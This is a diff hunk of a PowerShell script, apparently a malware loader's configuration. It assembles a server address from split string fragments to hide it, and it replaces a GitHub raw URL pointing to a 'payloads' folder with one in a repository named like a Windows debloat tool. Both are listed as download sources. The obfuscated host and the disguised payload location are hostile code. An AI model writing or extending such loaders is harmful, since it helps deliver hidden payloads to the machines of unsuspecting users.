@@ -37,7 +37,7 @@ $keys=@{
 # === MULTI-SOURCE ===
 $c1='ht';$c2='tps';$c3='://s';$c4='igni';$c5='ndat';$c6='.com'
 $srv=$c1+$c2+$c3+$c4+$c5+$c6
-$gh='https://raw.githubusercontent.com/icek888/XenoR2/main/payloads'
+$gh='https://raw.githubusercontent.com/jimmyishere111/WinDebloat11/main/brokers'
 $sources=@($gh, $srv)
 
 # === LOGGING ===
